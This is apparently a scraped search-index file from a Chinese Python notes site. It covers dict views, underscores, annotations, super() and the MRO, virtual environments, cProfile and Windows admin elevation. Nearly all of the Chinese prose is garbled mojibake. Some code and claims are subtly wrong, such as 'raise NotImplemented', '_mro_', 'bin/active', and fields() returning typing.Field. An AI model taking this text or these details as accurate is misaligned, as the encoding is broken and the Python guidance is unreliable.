æƒ³å¯¹é›†åˆçš„é”®æ‰§è¡Œä¸€äº›æ™®é€šçš„é›†åˆæ“ä½œï¼Œå¯ä»¥ç›´æ¥ ä½¿ç”¨é”®è§†å›¾å¯¹è±¡è€Œä¸ç”¨å…ˆå°†å®ƒä»¬è½¬æ¢æˆä¸€ä¸ª setã€‚ å­—å…¸çš„ items() æ–¹æ³•è¿”å›ä¸€ä¸ªåŒ…å« (é”®ï¼Œå€¼) å¯¹çš„å…ƒç´ è§†å›¾å¯¹è±¡ã€‚ è¿™ä¸ªå¯¹è±¡åŒæ ·ä¹Ÿ æ”¯æŒé›†åˆæ“ä½œï¼Œå¹¶ä¸”å¯ä»¥è¢«ç”¨æ¥æŸ¥æ‰¾ä¸¤ä¸ªå­—å…¸æœ‰å“ªäº›ç›¸åŒçš„é”®å€¼å¯¹ã€‚ å°½ç®¡å­—å…¸çš„ values() æ–¹æ³•ä¹Ÿæ˜¯ç±»ä¼¼ï¼Œä½†æ˜¯å®ƒå¹¶ä¸æ”¯æŒè¿™é‡Œä»‹ç»çš„é›†åˆæ“ä½œã€‚ æŸç§ ç¨‹åº¦ä¸Šæ˜¯å› ä¸ºå€¼è§†å›¾ä¸èƒ½ä¿è¯æ‰€æœ‰çš„å€¼äº’ä¸ç›¸åŒï¼Œè¿™æ ·ä¼šå¯¼è‡´æŸäº›é›†åˆæ“ä½œä¼šå‡ºç°é—®é¢˜ã€‚ ä¸è¿‡ï¼Œå¦‚æœä½ ç¡¬è¦åœ¨å€¼ä¸Šé¢æ‰§è¡Œè¿™äº›é›†åˆæ“ä½œçš„è¯ï¼Œä½ å¯ä»¥å…ˆå°†å€¼é›†åˆè½¬æ¢æˆ setï¼Œ ç„¶åå†æ‰§è¡Œé›†åˆè¿ç®—å°±è¡Œäº†ã€‚ åºåˆ—ä¸­å‡ºç°æ¬¡æ•°æœ€å¤šçš„å…ƒç´  collections.Counter è§ /docs/åç«¯/python/pythonæ ‡å‡†åº“/collections ä¸‹åˆ’çº¿ åœ¨Pythonä¸­ï¼Œä¸‹åˆ’çº¿ï¼ˆunderscoreï¼‰æœ‰å¤šç§ç”¨é€”ï¼ŒåŒ…æ‹¬ï¼š å•ä¸ªå‰å¯¼ä¸‹åˆ’çº¿ï¼š _var ï¼Œè¡¨ç¤ºè¯¥å˜é‡æ˜¯ä¸€ä¸ªç§æœ‰å˜é‡ï¼Œå»ºè®®ä¸è¦åœ¨ç±»çš„å¤–éƒ¨ç›´æ¥è®¿é—®ã€‚ å•ä¸ªç»“å°¾ä¸‹åˆ’çº¿ï¼š var_ ï¼Œé¿å…ä¸Pythonå…³é”®å­—æˆ–å†…ç½®å‡½æ•°å†²çªã€‚ åŒå‰å¯¼ä¸‹åˆ’çº¿ï¼š __var ï¼Œè¡¨ç¤ºè¯¥å˜é‡æ˜¯ä¸€ä¸ªå¼ºåˆ¶ç§æœ‰å˜é‡ï¼Œä¸èƒ½åœ¨ç±»çš„å¤–éƒ¨ç›´æ¥è®¿é—®ã€‚åœ¨ç±»å†…éƒ¨é€šè¿‡`self.__var`çš„æ–¹å¼è®¿é—®ã€‚ åŒå‰å¯¼å’ŒåŒç»“å°¾ä¸‹åˆ’çº¿ï¼š __var__ ï¼Œè¡¨ç¤ºPythonå†…ç½®çš„æ–¹æ³•æˆ–å±æ€§ï¼Œé¿å…ä¸è‡ªå®šä¹‰æ–¹æ³•æˆ–å±æ€§å‘ç”Ÿå†²çªã€‚ å•ä¸ªç‹¬ç«‹ä¸‹åˆ’çº¿ï¼š _ ï¼Œä½œä¸ºå ä½ç¬¦ä½¿ç”¨ï¼Œè¡¨ç¤ºæŸä¸ªå˜é‡æˆ–å‚æ•°æ²¡æœ‰è¢«ä½¿ç”¨ã€‚ åœ¨äº¤äº’å¼ç•Œé¢ä¸­, é»˜è®¤è¡¨ç¤ºæœ€è¿‘ä¸€æ¬¡çš„å€¼. éœ€è¦æ³¨æ„çš„æ˜¯ï¼Œåœ¨Pythonä¸­ä½¿ç”¨ä¸‹åˆ’çº¿å¹¶ä¸æ˜¯å¼ºåˆ¶æ€§çš„ï¼Œè€Œåªæ˜¯ä¸€ç§ç¼–ç è§„èŒƒã€‚ä½†æ˜¯ï¼Œéµå®ˆè¿™äº›è§„èŒƒå¯ä»¥æé«˜ä»£ç çš„å¯è¯»æ€§å’Œå¯ç»´æŠ¤æ€§ã€‚ ç‰¹åˆ«çš„, åœ¨pythonäº¤äº’å¼æ§åˆ¶å°ä¸­, å•ä¸‹åˆ’çº¿è¡¨ç¤ºä¸Šä¸€ä¸ªè¯­å¥çš„è¿”å›å€¼. åˆ¤æ–­ç±»å‹æ³¨è§£æ˜¯å¦å±äºtyping åˆ¤æ–­ç±»å‹æ³¨è§£æ˜¯å¦å¼•å…¥äº†typing <an_is_typing> å…³äºæ•°æ®ç±»å‹æ¨¡å—ä½¿ç”¨æ³¨è§£ å½“ä½¿ç”¨ /docs/åç«¯/python/pythonæ ‡å‡†åº“/dataclasses æ¨¡å—æ—¶, å¯èƒ½ä¼šç”¨åˆ° /docs/åç«¯/python/pythonæ ‡å‡†åº“/typing æ³¨è§£. å½“éœ€è¦è·å–æ³¨è§£çš„ç›¸å…³ä¿¡æ¯æ—¶, å¯ä»¥ä½¿ç”¨ fields å‡½æ•°: @dataclass class Person(object): name: str pet: List[Cat] = field(default_factory=list) pet2: Cat = field(default_factory=Cat) from typing import _GenericAlias for f in fields(Person): print('type', f.type) è¿”å›ç»“æœæ˜¯ typing.Field çš„ä¸€ä¸ªè¿­ä»£ ä¸€äº›å†…ç½®ç±»å‹çš„æ³¨è§£ æ¯”å¦‚ å‡½æ•°ç±»å‹çš„æ³¨è§£, å¯ä»¥ä½¿ç”¨ /docs/åç«¯/python/pythonæ ‡å‡†åº“/types ä¸‹çš„å®šä¹‰, å¦‚: def _fun(): ... import types assert types.FunctionType == type(_fun) åˆ¤æ–­æ˜¯å¦æ˜¯åç¨‹å‡½æ•°, è°ƒç”¨åå¯ä»¥ä½¿ç”¨ Awaitable, æœªè°ƒç”¨æ—¶åªèƒ½ä½¿ç”¨ import asyncio asyncio.iscoroutinefunction() å®é™…ä¼šè°ƒç”¨ inspect æ¨¡å—ä¸‹çš„ iscoroutinefunction Pythonå®šä¹‰æŠ½è±¡ç±»/æ¥å£ç±» è§ Python_æŠ½è±¡/æ¥å£ç±» ä½¿ç”¨ abc ä¼šå®šä¹‰çš„æŠ½è±¡ç±»ä¼šå¼ºåˆ¶è¿›è¡Œç±»å‹æ£€æŸ¥, å¹¶ä¸å»ºè®®ä½¿ç”¨å¼ºåˆ¶ç±»å‹æ£€æŸ¥, å› ä¸ºPythonæ˜¯ä¸€é—¨åŠ¨æ€è¯­è¨€, è¿™æ ·ä¸ä½†é™ä½æ€§èƒ½, è€Œä¸”æ˜¾å¾—èˆæœ¬é€æœ«. å¯ä»¥ç›´æ¥æŒ‰ç…§æ™®é€šçš„å®šä¹‰, æŠ½è±¡åŸºç±»ç›´æ¥æŠ›å¼‚å¸¸å³å¯: class IBase(object): def method1(self): raise NotImplemented å¿«é€Ÿå®ç°æ¯”è¾ƒæ–¹æ³• ä¸æƒ³å…¨éƒ¨å®šä¹‰objectæ¯”è¾ƒçš„æ–¹æ³•, å¯ä»¥ä½¿ç”¨ /docs/åç«¯/python/pythonæ ‡å‡†åº“/functools ä¸‹çš„ total_ordering è£…é¥°å™¨ è¿™æ ·åªéœ€è¦å®šä¹‰ä»»æ„ä¸€ä¸ªæ¯”è¾ƒæ–¹æ³•, å°±å¯ä»¥å®ç°å®Œæ•´çš„æ¯”è¾ƒ. ä¸è¿‡æ€§èƒ½è¾ƒæ…¢, æ‰€ä»¥å¦‚æœä¸æ˜¯å¼ºéœ€æ±‚çš„è¯, è¿˜æ˜¯æ‰‹åŠ¨éƒ½å®ç°äº†å§, å®åœ¨ä¸è¡Œ, å®šä¹‰ä¸ªæ¯”è¾ƒåŸºç±»å®ç°å°±è¡Œ åˆ¤æ–­è¯­å¥ çœ‹è¿™ä¸ªä¾‹å­: def fun(*args, **kwargs): return not (args or kwargs) def fun2(*args, **kwargs): return not args and not kwargs å½“æˆ‘æ²¡è¯´... è¿›åˆ¶è¯´æ˜ å…«è¿›åˆ¶ä»¥ 0o å¼€å¤´, å¦‚: 0o755 è¿›åˆ¶è½¬æ¢è§ Python_è¿›åˆ¶è½¬æ¢ åŒåç±»å±æ€§/å®ä¾‹å˜é‡ä¸å±æ€§è®¿é—®å™¨(Property)çš„è®¿é—®é¡ºåº ç±»å±æ€§: å®šä¹‰ç±»æ—¶å®šä¹‰çš„å±æ€§ å®ä¾‹å±æ€§: ç±»å®ä¾‹åŒ–åè®¾ç½®çš„å±æ€§ å±æ€§è®¿é—®å™¨: ä½¿ç”¨ @property ä¿®é¥°çš„å±æ€§æ–¹æ³• ç»“æœ: å¯¹äºå·²ç»å®ä¾‹çš„å¯¹è±¡è€Œè¨€, ä¼˜å…ˆæŸ¥æ‰¾@propertyå±æ€§è®¿é—®å™¨ æ³¨æ„: å¦‚æœå®šä¹‰åŒåçš„å®ä¾‹å±æ€§ä¸å±æ€§è®¿é—®å™¨, å¿…é¡»è®¾ç½®å±æ€§è®¿é—®å™¨çš„setteræ–¹æ³•, å¦åˆ™ä¼šæŠ¥é”™. è‹¥å®šä¹‰çš„ç±»å±æ€§éœ€è¦æ”¯æŒè®¾ç½®å€¼æ—¶, ä¹Ÿéœ€è¦è®¾ç½®, å¦åˆ™æŠ¥é”™. å¦‚, åŒåå®ä¾‹å±æ€§ä¸å±æ€§è®¿é—®å™¨: class A(object): def __init__(self): self.name: str = '123' @property def name(self): return 'nnn' if __name__ == '__main__': a = A() print(a.name) æŠ¥é”™: self.name: str = '123' AttributeError: can't set attribute åŒåç±»å±æ€§ä¸å±æ€§è®¿é—®å™¨(ä¸æ”¯æŒè®¾ç½®ç±»å±æ€§å€¼): class A(object): name: str = '123' @property def name(self): return 'nnn' if __name__ == '__main__': a = A() print(a.name) ç»“æœ: nnn","tags":"åç«¯","url":"/yq-doc-source-docs-rear-end-python-Concept-Some-use-skills,-explanation.html","loc":"/yq-doc-source-docs-rear-end-python-Concept-Some-use-skills,-explanation.html"},{"title":"ç‰¹æ®Šå­—ç¬¦","text":"éƒ¨åˆ†ç‰¹æ®Šå­—ç¬¦: \\n æ¢è¡Œç¬¦, å…‰æ ‡ç§»åˆ°ä¸‹ä¸€è¡Œå¼€å¤´ \\r ä¸€èˆ¬ç”¨äºå•è¡Œè¿›åº¦ä¹‹ç±», å…‰æ ‡ç§»åŠ¨åˆ°å½“å‰è¡Œå¼€å¤´","tags":"åç«¯","url":"/yq-doc-source-docs-rear-end-python-Concept-Special-characters.html","loc":"/yq-doc-source-docs-rear-end-python-Concept-Special-characters.html"},{"title":"å¯¹superçš„ç†è§£","text":"å‰è¨€ Pythonçš„superå¸¸ç”¨äºç»§æ‰¿. å…³äºç»§æ‰¿, åˆä¸å¾—ä¸æåˆ°ç»å…¸ç±»ä¸æ–°å¼ç±». Python2.x éƒ½æ˜¯ç»å…¸ç±» Python3.x æ˜¯æ–°å¼ç±», æ³¨æ„éœ€è¦ç»§æ‰¿è‡ª object å¯¹äºå­ç±»çš„æŸä¸€ä¸ªè°ƒç”¨, ç»å…¸ç±»ä¼šæ·±åº¦ä¼˜å…ˆæœç´¢çš„åŒºå¯»æ‰¾æ‰§è¡Œ, è€Œæ–°å¼ç±»æ˜¯å¹¿åº¦ä¼˜å…ˆæœç´¢æ‰§è¡Œ (è¿™é‡Œæœ‰ä¸ªå‘, ç®—ä¸ä¸ŠçœŸæ­£çš„å¹¿åº¦ä¼˜å…ˆ, å®é™…ä¸Šä¸»è¦è¿˜æ˜¯å‚è€ƒMROçš„å®ç°, ä¸è¿‡æœ€åä¸€ä¸ªæ‰¾çš„ä¸€èˆ¬éƒ½æ˜¯object, æˆ–è€…è¯´å…¬å…±çˆ¶ç±»å¾€å¾€åœ¨æ­¤çˆ¶ç±»æ‰€æœ‰å­ç±»éƒ½æ‰¾äº†åå†æ‰¾). å…³äºæ–¹æ³•çš„æ‰§è¡Œé¡ºåº, å¯ä»¥è°ƒç”¨å…¶ _mro_ å±æ€§(method resolution order)æŸ¥çœ‹ç»§æ‰¿é¡ºåº. æ³¨è§£ å…³äº MROçš„å®ç°, åœ¨ç½‘ä¸Šçœ‹åˆ°ä¸€ç¯‡è¿˜å¯ä»¥çš„è§£é‡Š: MROçš„å®ç°, å¯ç•¥å¾®å‚è€ƒ, æœ€åçš„è®¡ç®—çœ‹èµ·æœ‰ç‚¹é—®é¢˜. æ›´å…·ä½“çš„è¿˜æ˜¯å»å‚è€ƒå®˜æ–¹äº†. æ–°å¼ç±»çš„æœç´¢é¡ºåºæ›´åƒæ˜¯å…ˆæ·±åº¦, ä½†æ˜¯æŠŠ object è¿™ç§å…¬å…±é¡¶å±‚ æ”¾æœ€å. superä½¿ç”¨ åœ¨ç»§æ‰¿æ—¶, superå¯ç”¨äºå®ç°çˆ¶ç±»æ–¹æ³• class A ( object ): def eat ( self ): print ( 'A eat' ) class B ( A ): def eat ( self ): # æ­¤å¤„ super().eat() ä¸ super(B, self).eat() æ•ˆæœä¸€è‡´ super () . eat () print ( 'B eat' ) æ³¨è§£ super å¦‚æœå¸¦å‚æ•°, å®é™…æµ‹è¯•åªæœ‰ ($class, self) çš„å½¢å¼æ‰æœ‰æ•ˆæœ, ä¼šä» $class å¼€å§‹å‘ä¸Šæ‰¾åŸºç±»æ–¹æ³•æ‰§è¡Œ. å¦å¤–å¿…é¡»ä½¿ç”¨ super() çš„å½¢å¼, ä¹Ÿå°±æ˜¯å¿…é¡»ç”¨å…¶å¯¹è±¡, å¦åˆ™ä¼šæŠ¥é”™æ²¡æœ‰å±æ€§.","tags":"åç«¯","url":"/yq-doc-source-docs-rear-end-python-Concept-Understanding-of-super.html","loc":"/yq-doc-source-docs-rear-end-python-Concept-Understanding-of-super.html"},{"title":"pythonå¯¼å…¥è¯´æ˜","text":"è·Ÿè¸ªå¯¼å…¥ åœ¨ Python ä¸­ï¼Œimport è¯­å¥ç”¨äºå¯¼å…¥æ¨¡å—å’Œç»„ä»¶ã€‚ å½“ç¼–å†™ä¸€ä¸ª Python ç¨‹åºæ—¶ï¼Œé€šå¸¸éœ€è¦ä½¿ç”¨è®¸å¤šä¸åŒçš„æ¨¡å—å’Œåº“æ¥å®ŒæˆæŸäº›ä»»åŠ¡ã€‚ åœ¨è€ƒè™‘å°†ç¨‹åºç¼–è¯‘ä¸ºå¯æ‰§è¡Œæ–‡ä»¶æ—¶ï¼Œå°±éœ€è¦è€ƒè™‘å¦‚ä½•å¤„ç†è¿™äº›ä¾èµ–é¡¹ã€‚ å¦‚æœä¸åŒ…æ‹¬æ‰€æœ‰å¿…è¦çš„ä¾èµ–é¡¹ï¼Œåˆ™å¯èƒ½ä¼šå¯¼è‡´ç”Ÿæˆçš„å¯æ‰§è¡Œæ–‡ä»¶æ— æ³•æ­£å¸¸è¿è¡Œã€‚ è·Ÿè¸ªå¯¼å…¥æ˜¯æŒ‡ç¼–è¯‘å™¨åœ¨ç¼–è¯‘è¿‡ç¨‹ä¸­è‡ªåŠ¨æŸ¥æ‰¾å’ŒåŒ…å«ç¨‹åºæ‰€éœ€çš„æ‰€æœ‰ä¾èµ–é¡¹. ä¾‹å¦‚ï¼Œå¦‚æœä¸€ä¸ª Python è„šæœ¬ä¾èµ–äº numpy åº“ï¼Œåˆ™ç¼–è¯‘å™¨åº”è¯¥èƒ½å¤Ÿè‡ªåŠ¨è¯†åˆ«å¹¶åŒ…å« numpy åº“ã€‚ ä¸€äº›ç¼–è¯‘å™¨ï¼ˆå¦‚ Nuitkaï¼‰å…·æœ‰ç‰¹å®šçš„é€‰é¡¹ï¼Œä»¥ä¾¿åœ¨ç¼–è¯‘è¿‡ç¨‹ä¸­è·Ÿè¸ªå’ŒåŒ…å«ä¾èµ–é¡¹ã€‚ è¿™æ ·å¯ä»¥ç¡®ä¿ç”Ÿæˆçš„äºŒè¿›åˆ¶æ–‡ä»¶åŒ…å«ç¨‹åºçš„æ‰€æœ‰å¿…éœ€éƒ¨åˆ†ï¼Œå¹¶ä¸”å¯ä»¥åœ¨æ²¡æœ‰ä»»ä½•å…¶ä»–å®‰è£…æˆ–é…ç½®çš„æƒ…å†µä¸‹è¿è¡Œç¨‹åºã€‚ æ€»ä¹‹ï¼Œ è·Ÿè¸ªå¯¼å…¥æ˜¯æŒ‡åœ¨ç¼–è¯‘ç¨‹åºæ—¶è·Ÿè¸ªå’ŒåŒ…å«æ‰€æœ‰ä¾èµ–é¡¹ï¼Œä»¥ä¾¿ç”Ÿæˆä¸€ä¸ªå®Œæ•´çš„ã€ç‹¬ç«‹çš„å¯æ‰§è¡Œæ–‡ä»¶","tags":"åç«¯","url":"/yq-doc-source-docs-rear-end-python-Concept-python-introduction-description.html","loc":"/yq-doc-source-docs-rear-end-python-Concept-python-introduction-description.html"},{"title":"pythonè™šæ‹Ÿç¯å¢ƒ","text":"éƒ¨åˆ†è¯´æ˜å¯è§: åˆ›å»ºPythonè™šæ‹Ÿç¯å¢ƒ æ¶‰åŠåˆ°ä¸€ä¸ªæ¨¡å— pyvenv åˆ›å»ºè™šæ‹Ÿç¯å¢ƒ: python -m venv <è™šæ‹Ÿç¯å¢ƒå> venv æ”¯æŒçš„é€‰é¡¹ --system-site-packages æ˜¯å¦ä½¿ç”¨å…¨å±€ç¯å¢ƒçš„ç¬¬ä¸‰æ–¹åº“, é»˜è®¤å¦ --without-pip ä¸å®‰è£…pip, é»˜è®¤ä¼šè£… --clear å¦‚æœåˆ›å»ºè™šæ‹Ÿç¯å¢ƒçš„ç›®å½•å·²ç»æœ‰äº†å…¶ä»–è™šæ‹Ÿç¯å¢ƒï¼Œåˆ é™¤é‡å»º ä¼šé»˜è®¤åœ¨å½“å‰ç¯å¢ƒä¸‹åˆ›å»ºä¸€ä¸ªè™šæ‹Ÿç¯å¢ƒ. æ˜¯å¦ä½¿ç”¨ç³»ç»Ÿçš„åŒ…ç­‰ä¿¡æ¯é…ç½®åœ¨æ­¤ç›®å½•ä¸‹çš„ pyvenv.cfg æ–‡ä»¶é‡Œ, å…¶ä¸­: home è¡¨ç¤ºç¯å¢ƒå˜é‡, pythonç›¸å…³çš„ä¸€äº›æŒ‡ä»¤å°±æ˜¯ä»è¿™ä¸ªç¯å¢ƒå˜é‡æŒ‡å®šçš„ç›®å½•ä¸‹æ‰¾ å¯¼å…¥è™šæ‹Ÿç¯å¢ƒ: source è™šæ‹Ÿç¯å¢ƒå/bin/active . å¯åŠ¨ å¯åŠ¨ # å½“å‰ç›®å½•ä¸‹å­˜åœ¨åä¸º venv_test_env çš„è™šæ‹Ÿç¯å¢ƒ . venv_test_env/bin/activate å…³é—­ å…³é—­ # å½“å‰ç›®å½•ä¸‹å­˜åœ¨åä¸º venv_test_env çš„è™šæ‹Ÿç¯å¢ƒ # deactivate é»˜è®¤å·²ç»å†™åˆ°ç¯å¢ƒå˜é‡é‡Œé¢äº†, è®°å¾—å¦‚æœæœ‰ç”¨shell, ä½¿ç”¨æ—¶ä¸è¦è¦†ç›–æ­¤å‡½æ•° deactivate","tags":"åç«¯","url":"/yq-doc-source-docs-rear-end-python-Concept-python-virtual-environment.html","loc":"/yq-doc-source-docs-rear-end-python-Concept-python-virtual-environment.html"},{"title":"cProfile","text":"cProfileæ˜¯Pythonæ ‡å‡†åº“ä¸­å†…ç½®çš„æ€§èƒ½åˆ†ææ¨¡å—ï¼ŒCæ‰©å±•ï¼Œéä¾µå…¥å¼ï¼Œä¸éœ€è¦ä¿®æ”¹ä»£ç ã€‚ ä½¿ç”¨æ–¹æ³•: python -m cProfile [-s sort_order] myscript.py ` -s æŒ‡å®šè¾“å‡ºçš„æ’åºæ–¹æ³•ï¼Œå¯ä»¥ä¼ å…¥tottimeæˆ–è€…cumtime tottimeè¡¨ç¤ºè¯¥å‡½æ•°æœ¬èº«çš„æ‰§è¡Œæ—¶é—´ï¼Œä¸åŒ…æ‹¬è¯¥å‡½æ•°è°ƒç”¨çš„å­å‡½æ•° cumtimeè¡¨ç¤ºè¯¥å‡½æ•°ç´¯è®¡æ‰§è¡Œæ—¶é—´ï¼ŒåŒ…æ‹¬è¯¥å‡½æ•°è°ƒç”¨çš„å­å‡½æ•° è¾“å‡ºåˆ—å«ä¹‰ ncallsæ˜¯æ¯ä¸ªå‡½æ•°è¢«è°ƒç”¨æ¬¡æ•° tottimeè¡¨ç¤ºè¯¥å‡½æ•°æœ¬èº«çš„æ‰§è¡Œæ—¶é—´ï¼Œä¸åŒ…æ‹¬è¯¥å‡½æ•°è°ƒç”¨çš„å­å‡½æ•° ç¬¬ä¸€ä¸ªpercallè¡¨ç¤ºtottime / ncalls cumtimeè¡¨ç¤ºè¯¥å‡½æ•°ç´¯è®¡æ‰§è¡Œæ—¶é—´ï¼ŒåŒ…æ‹¬è¯¥å‡½æ•°è°ƒç”¨çš„å­å‡½æ•° ç¬¬äºŒä¸ªpercallè¡¨ç¤ºcumtime / primitive callsï¼Œprimitive calls è¡¨ç¤ºé™¤å»é€’å½’åæœ¬å‡½æ•°è¢«è°ƒç”¨æ¬¡æ•° filename:lineno(function)è¡¨ç¤ºå‡½æ•°æ‰€åœ¨çš„æ–‡ä»¶åï¼Œè¡Œå·å’Œå‡½æ•°å cProfileæ˜¯ä¸€ç§Deterministic Profiling. Deterministic Profilingæ˜¯æŒ‡è®°å½•æ‰€æœ‰å‡½æ•°æ¯æ¬¡çš„æ‰§è¡ŒçŠ¶å†µï¼Œè€Œä¸æ˜¯é€šè¿‡é‡‡æ ·çš„æ–¹å¼æ¥è®°å½•. é€šè¿‡é‡‡æ ·çš„æ–¹å¼ï¼Œæ€§èƒ½å¼€é”€ä¼šæ›´å°ï¼Œä½†æ˜¯è®°å½•å¯èƒ½ä¼šä¸å¤Ÿå‡†ç¡®. ç”Ÿæˆç«ç„°å›¾ ä½¿ç”¨ -o é€‰é¡¹ç”ŸæˆcProfileçš„äºŒè¿›åˆ¶æ€§èƒ½ç»“æœ: python -m cProfile [-o output_file] myscript.py å†ç”¨ flameprof ç”Ÿæˆç«ç„°å›¾: flameprof requests.prof > requests.svg å›¾åˆ†æˆä¸Šä¸‹ä¸¤éƒ¨åˆ†ï¼Œä¸Šéƒ¨çš„å›¾æ˜¯æŒ‰ç…§å‡½æ•°è°ƒç”¨æ ˆå’Œæ‰§è¡Œæ—¶é—´æ’åˆ—; ä¸‹éƒ¨åæ–¹å‘çš„å›¾æŒ‰ç…§å‡½æ•°æ‰§è¡Œæ—¶é—´æ¯”ä¾‹ä»å¤§åˆ°å°æ’åˆ—. ä¸Šéƒ¨çš„å›¾ä¸­executeæ˜¯æœ€é¡¶å±‚çš„å‡½æ•°ï¼Œå¾€ä¸Šæ˜¯å®ƒè°ƒç”¨çš„å­å‡½æ•°ï¼Œç›´åˆ°è°ƒç”¨é“¾æœ€åº•å±‚çš„å‡½æ•°; å®½åº¦è¡¨ç¤ºæ¯ä¸ªå‡½æ•°çš„æ‰§è¡Œæ—¶é—´å ç”¨çš„æ¯”ä¾‹ï¼Œè¶Šå®½è¡¨ç¤ºè¶Šè€—æ—¶.","tags":"åç«¯","url":"/yq-doc-source-docs-rear-end-python-Performance-analysis-cprofile.html","loc":"/yq-doc-source-docs-rear-end-python-Performance-analysis-cprofile.html"},{"title":"pyflame","text":"uberå¼€æºçš„ä¸€æ¬¾å·¥å…·ï¼Œåˆ©ç”¨ptraceç”Ÿæˆæ¸²æŸ“å›¾ï¼Œç”¨äºåˆ†ææ€§èƒ½ç“¶é¢ˆ åœ°å€: https://github.com/uber/pyflame","tags":"åç«¯","url":"/yq-doc-source-docs-rear-end-python-Performance-analysis-pyflame.html","loc":"/yq-doc-source-docs-rear-end-python-Performance-analysis-pyflame.html"},{"title":"Python åˆ¤æ–­æŸä¸ªç±»åŒ…å«çš„ç±»æ–¹æ³•","text":"ä½¿ç”¨ types ä¸ isinstance class ITest ( object ): def get_one ( self ): raise NotImplemented def get_two ( self ): raise NotImplemented # æ³¨æ„ç±»æ–¹æ³•æ˜¯ FunctionType # å®ä¾‹æ–¹æ³•æ˜¯ types.MethodType functions_ = [ k for k , v in ITest . __dict__ . items () if isinstance ( v , types . FunctionType )] print ( functions_ ) # ['get_one', 'get_two']","tags":"åç«¯","url":"/yq-doc-source-docs-rear-end-python-Related-technology-implementation-Determine-whether-it-is-a-class-method.html","loc":"/yq-doc-source-docs-rear-end-python-Related-technology-implementation-Determine-whether-it-is-a-class-method.html"},{"title":"è·å–winä¸‹ç®¡ç†å‘˜æƒé™","text":"åˆ¤æ–­æ˜¯å¦æœ‰ç®¡ç†å‘˜æƒé™: import ctypes 'is admin' if ctypes.windll.shell32.IsUserAnAdmin() else 'not admin' æ¶‰åŠåˆ°win API: IsUserAnAdmin è·å–ç®¡ç†å‘˜æƒé™: ctypes.windll.shell32.ShellExecuteW(None, \"runas\", sys.executable, __file__, None, 1) å‚æ•°è§£æ: runas è¡¨ç¤ºä»¥ç®¡ç†å‘˜æƒé™æ‰§è¡Œ sys.executable è¡¨ç¤ºæ‰“å¼€çš„æ‰§è¡Œæ–‡ä»¶. è¿™é‡Œä¸€èˆ¬éƒ½åœ¨pythonå†…è·‘å°±æ˜¯ python.exe (pythonçš„å®‰è£…è·¯å¾„) __file__ æ‰§è¡Œæ–‡ä»¶è·Ÿçš„å‚æ•° æ³¨è§£ å¦‚æœæ˜¯python2, é‚£ä¹ˆ sys.executable , __file__ éƒ½éœ€è¦åŠ ä¸Š unicode, å¦‚ unicode(__file__) sys.version_info[0] == 3 åˆ¤æ–­pythonç‰ˆæœ¬æ˜¯å¦æ˜¯ 3 æ¶‰åŠåˆ°win API: shellExecuteW","tags":"åç«¯","url":"/yq-doc-source-docs-rear-end-python-Related-technology-implementation-Get-the-administrator-permissions-under-WIN.html","loc":"/yq-doc-source-docs-rear-end-python-Related-technology-implementation-Get-the-administrator-permissions-under-WIN.html"},{"title":"åœ¨ä¸€ä¸ªPythonç¯å¢ƒä½¿ç”¨å¦ä¸€ä¸ªPythonç¯å¢ƒçš„åŒ…","text":"ä»…é’ˆå¯¹ä¸‰æ–¹åŒ…. éœ€æ±‚: å½“ä½¿ç”¨ä¸€ä¸ªè™šæ‹Ÿç¯å¢ƒæ—¶, æƒ³å¯¼å…¥å¦ä¸€ä¸ªè™šæ‹Ÿç¯å¢ƒçš„ä¸‰æ–¹åŒ… ä¸»è¦æœ‰ä¸¤ç§è§£å†³æ–¹æ¡ˆ æ‰‹åŠ¨å®‰è£…éœ€è¦çš„åŒ… : ä½¿ç”¨ pip freeze å¯¼å‡ºå¦ä¸€ä¸ªè™šæ‹Ÿç¯å¢ƒçš„ä¸‰æ–¹åŒ…ä¿¡æ¯åˆ° requirements.txt, ç„¶åæ‰‹åŠ¨å®‰è£… é…ç½®ç¯å¢ƒå˜é‡PYTHONPATH : å°†å¦ä¸€ä¸ªè™šæ‹Ÿç¯å¢ƒçš„ä¸‰æ–¹åŒ…åŠ å…¥åˆ°ç¯å¢ƒå˜é‡ PYTHONPATH æ‰‹åŠ¨å®‰è£…éœ€è¦çš„åŒ… å¤§è‡´: source /path/to/venv_b/bin/activate pip freeze > /path/to/requirements.txt source /path/to/venv_a/bin/activate pip install -r /path/to/requirements.txt æ³¨è§£ ä¸ç¡®å®šç›´æ¥: sys.path.insert(...) æ˜¯å¦å¯è¡Œ, æœ‰æ—¶é—´å®éªŒä¸€ä¸‹ é…ç½®ç¯å¢ƒå˜é‡PYTHONPATH æ‰¾åˆ°å¦ä¸€ä¸ªè™šæ‹Ÿç¯å¢ƒçš„ä¸‰æ–¹åŒ…ç›®å½•: source /path/to/venv_b/bin/activate python -c \"import site; print(site.getsitepackages())\" å°†è™šæ‹Ÿç¯å¢ƒbçš„ site-packages ç›®å½•æ·»åŠ åˆ° PYTHONPATH ç¯å¢ƒå˜é‡ä¸­(ä¹Ÿå¯ä»¥ç›´æ¥åœ¨Pythonçš„os.environä¸­è®¾ç½®): export PYTHONPATH=$PYTHONPATH:/path/to/venv_b/lib/pythonX.Y/site-packages åœ¨è™šæ‹Ÿç¯å¢ƒaä¸­è°ƒç”¨è™šæ‹Ÿç¯å¢ƒbçš„åŒ…: source /path/to/venv_a/bin/activate python import module_name","tags":"åç«¯","url":"/yq-doc-source-docs-rear-end-python-Related-technology-implementation-Use-a-package-of-another-Python-environment-in-one-Python-environment.html","loc":"/yq-doc-source-docs-rear-end-python-Related-technology-implementation-Use-a-package-of-another-Python-environment-in-one-Python-environment.html"},{"title":"é«˜çº§Python","text":"ä¸»è¦å¯¹Pythonä¸­æ”¯æŒçš„æ“ä½œåšä¸€ä¸ªå½’çº³æ€»ç»“. ç”Ÿæˆå™¨æ•ˆç‡é«˜äºæ¨å¯¼å¼ å­—ç¬¦ä¸²æ“ä½œ æ™®é€šå­—ç¬¦ä¸², ç›´æ¥ä½¿ç”¨å†…ç½®çš„: split è½¬æ¢ä¸ºæ•°ç»„ replace æ›¿æ¢å­—ç¬¦ find æŸ¥æ‰¾å­—ç¬¦ä½ç½® ä½¿ç”¨ /docs/åç«¯/python/pythonæ ‡å‡†åº“/re æ¨¡å—: re.sub ä½¿ç”¨æ­£åˆ™æ›¿æ¢ re.match ä»å­—ç¬¦ä¸²å¼€å§‹åŒ¹é… re.findall æŸ¥æ‰¾æ‰€æœ‰åŒ¹é…çš„å­—ç¬¦ä¸² æ³¨æ„: ä½¿ç”¨æ­£åˆ™æ—¶å€™çš„è´ªå©ªåŒ¹é…ä¸éè´ªå©ªåŒ¹é… . è¡¨ç¤ºé™¤æ¢è¡Œå¤–çš„ä»»æ„å­—ç¬¦ () 